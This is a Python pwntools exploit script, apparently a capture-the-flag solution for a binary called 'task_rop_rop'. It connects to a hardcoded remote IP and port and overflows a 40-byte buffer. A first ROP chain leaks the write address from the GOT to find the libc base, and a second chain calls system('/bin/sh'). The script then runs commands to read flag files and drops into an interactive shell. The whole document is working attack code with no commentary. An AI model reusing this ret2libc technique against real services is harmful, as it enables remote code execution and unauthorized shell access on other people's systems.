#!/usr/bin/env python3
from pwn import *

context.binary = e = ELF("./task_rop_rop", checksec=False)
libc = ELF("./libc-2.31.so", checksec=False)
context.log_level = "info"
HOST, PORT = "109.233.56.90", 11653

POP_RDI = 0x400713
POP_RSI_R15 = 0x400711
POP_RDX = 0x400693
RET = 0x4004c6
MAIN = 0x400630
WRITE_PLT = e.plt['write']
GOT_WRITE = e.got['write']
OFF = 40

io = remote(HOST, PORT)
io.recvuntil(b"Hi\n")

r = flat(
    b"A"*OFF,
    POP_RDI, 1,
    POP_RSI_R15, GOT_WRITE, 0,
    POP_RDX, 8,
    WRITE_PLT,
    MAIN,
)
io.send(r)
leak = u64(io.recvn(8))
libc.address = leak - libc.sym.write
log.success("write@libc = %#x", leak)
log.success("libc base = %#x", libc.address)
assert libc.address & 0xfff == 0, "база не выровнена — не та libc/оффсет"

io.recvuntil(b"Hi\n")

binsh = next(libc.search(b"/bin/sh\x00"))
system = libc.sym.system
r2 = flat(
    b"A"*OFF,
    POP_RDI, binsh,
    RET,
    system,
)
io.send(r2)

io.sendline(b"id; echo PWNED; cat /flag* 2>/dev/null; cat flag* 2>/dev/null; /bin/getflag 2>/dev/null")
print(io.recvrepeat(3).decode(errors="replace"))
io.interactive()
